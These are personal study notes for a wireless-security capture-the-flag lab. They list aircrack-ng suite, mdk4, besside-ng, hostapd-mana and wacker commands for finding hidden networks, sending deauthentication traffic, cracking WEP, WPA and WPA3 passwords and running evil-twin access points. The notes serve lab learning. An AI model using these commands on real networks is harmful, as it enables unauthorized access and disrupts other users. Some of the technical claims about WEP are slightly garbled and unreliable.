# Files: 
https://wifichallengelab.com/challenges  

# Solve:
https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/#05-what-is-the-flag-in-the-hidden-ap-router-behind-default-credentials  
https://r4ulcl.com/posts/wifi_db-in-wifichallenge-lab/  

# Something new:
1) **airodump-ng** --> sudo airmon-ng start wlan0.  
                       sudo airodump-ng wlan0mon -w ~/wifi/scan --band abg --wps --manufacturer
2) **ESSID of hidden AP** --> https://xre0us.io/posts/identifying-ap-with-hidden-ssid/  
        sudo airmon-ng start wlan0  
        iwconfig wlan0mon channel <channel_number>  
        sudo mdk4 wlan0mon p -t <MAC> -f <wordlist>
3) **Connection using specific ESSID** --> Create config file  
       wpa_supplicant -Dnl80211 -iwlan2 -c <config_file>
       dhclient wlan2 -v  
4) To get valid credentials for login as well as the login.php you have to change the MAC address to that of the client using the ESSID.  
5) **besside-ng** --> used to crack WEP passwords and capture WPA handshakes.  
           besside-ng -c <channel_number> -b <_bssid_> wlan2 -v  
6) **Cracking WEP passwords** --> Capture data using airodump-ng.  
           To generate extra data to the AP,we can launch a fake authentification using --> sudo aireplay-ng -1 3600 -q  10 -a <_BSSID_> wlan0mon.  
           Also extra ARP packets can be generated using(ARP request-replay attack) --> sudo aireplay-ng --arpreplay -b <_BSSID_> -h <client_MAC> wlan0mon.  
           Use aircrack-ng to crack pwd.  
7) **WEP** --> uses RC4 symmetric scheme, and the data is prepended with an IV which contains info about the key in use.  
            The IV is of 3bytes, out of which 2 bits are used for defining the encryption key in use.  
            The key is 40/104 bits long which along with the IV makes it 64/128 bits.  
            This key will perform XOR with the data and CRC and generate CT.  
            2 ways to boost ARP traffic in air -> 1) try fake auth with the AP 2) Disconnect legitimate users from the AP. (using aireplay-ng --deauth/--arpreplay/--fakeauth.  
            https://www.computerweekly.com/tip/Step-by-step-aircrack-tutorial-for-Wi-Fi-penetration-testing.  
8) **airedecap-ng** --> airdecap-ng -e <_bssid_> -p $PASSWORD <.cap file>  
9) **To get password of BSSID no longer there in network** --> create a fake AP with hostapd-mana and then get the handshakes of the clients that ask for this AP, perform a dictionary attack and get pwd.
10) **WPA3** --> https://github.com/blunderbuss-wctf/wacker
          Passwords for WPA3 can be bruteforced using **wacker**.
          ./wacker.py --wordlist ~/rockyou-top100000.txt --ssid <> --bssid <> --interface wlan2 --freq 2462  
          WPA3's SAE(Simultaneous Authentification of Equals) also known as **dragonfly** is affected by password-partitioning attacks which occur by abusing timing or cache-based side channel attacks.
          The side channel attacks target the protocol's password encoding algorithm.
          
          Cache-based attack exploys the hash-to-curve algorithm.  
          https://kaliboys.com/wp-content/uploads/2019/04/dragonbloodkaliboys.com_.pdf#:~:text=Most%20prominently%2C%20we%20show%20that%20WPA3%E2%80%99s%20Simultaneous%20Authentication,password%20by%20abusing%20timing%20or%20cache-based%20side-channel%20leaks.
        WPA3-SAE(home network) and WPA3-Enterprise(Enterprise networks).  
        After the SAE handshake, we get a Pairwise Master Key(PMK) which is used for a 4-way handshake to get Pairwise Transient Key(PTK).  
        The Management Frame Protocol(MFP) is used to prevent deauthentification attacks in both the modes.  
11) **MGT** --> Commonly used in corporate networks.  
                In these networks each user has their own authentification which can be a username and password or a certificate.  
                Attacks against MGT involve obtaining reconnaissance of the clients and AP, identity info,certificate info and EAP info about the network.  
                To create a TLS tunnel between the MGT network and client, the AP sends the Certificate in PT which can be viewed using **pcapfilter.sh**  
                https://github.com/r4ulcl/wifi_db  
    https://gist.github.com/r4ulcl/f3470f097d1cd21dbc5a238883e79fb2  
    https://github.com/blackarrowsec/EAP_buster
    
     
    
          

          

            
